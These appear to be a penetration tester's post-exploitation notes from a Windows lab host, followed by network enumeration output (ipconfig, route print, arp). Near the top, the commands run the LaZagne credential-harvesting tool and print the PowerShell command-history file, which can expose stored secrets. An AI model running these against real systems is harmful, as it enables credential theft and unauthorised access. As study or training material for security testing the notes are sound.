powercfg /change standby-timeout-ac 0
powercfg /change hibernate-timeout-ac 0
powercfg /change hibernate-timeout-dc 0
clear
ls
cd Desktop
ls
.\LaZagne.exe all
(Get-PSReadlineOption).HistorySavePath
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

				NETWORK: 
PS C:\Users\Administrator\Desktop> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.230.227
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.230.254

PS C:\Users\Administrator\Desktop> route print
===========================================================================
Interface List
  9...00 50 56 ab 7b 0c ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.230.254  192.168.230.227     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.230.0    255.255.255.0         On-link   192.168.230.227    271
  192.168.230.227  255.255.255.255         On-link   192.168.230.227    271
  192.168.230.255  255.255.255.255         On-link   192.168.230.227    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.230.227    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.230.227    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.230.254       1
===========================================================================
IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

PS C:\Users\Administrator\Desktop> arp -A
Interface: 192.168.230.227 --- 0x9
  Internet Address      Physical Address      Type
  192.168.50.254        00-50-56-ab-36-31     dynamic
  192.168.230.254       00-50-56-ab-36-31     dynamic
  192.168.230.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static



-----------------------------------------------------------------------------------------
